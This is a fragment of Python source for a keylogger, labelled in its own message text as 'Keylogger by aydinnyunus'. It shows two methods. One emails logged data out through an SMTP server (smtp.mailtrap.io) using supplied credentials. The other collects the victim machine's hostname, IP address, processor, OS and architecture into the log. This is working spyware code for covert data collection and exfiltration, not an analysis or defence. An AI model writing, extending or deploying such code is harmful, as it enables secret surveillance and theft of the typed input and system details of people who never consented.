def send_mail(self, email, password, message):
            sender = "Private Person <from@example.com>"
            receiver = "A Test User <to@example.com>"

            m = f"""\
            Subject: main Mailtrap
            To: {receiver}
            From: {sender}

            Keylogger by aydinnyunus\n"""

            m += message
            with smtplib.SMTP("smtp.mailtrap.io", 2525) as server:
                server.login(email, password)
                server.sendmail(sender, receiver, message)

# Same all -------------s

def system_information(self):
            hostname = socket.gethostname()
            ip = socket.gethostbyname(hostname)
            plat = platform.processor()
            system = platform.system()
            machine = platform.machine()
            self.appendlog(hostname)
            self.appendlog(ip)
            self.appendlog(plat)
            self.appendlog(system)
            self.appendlog(machine)
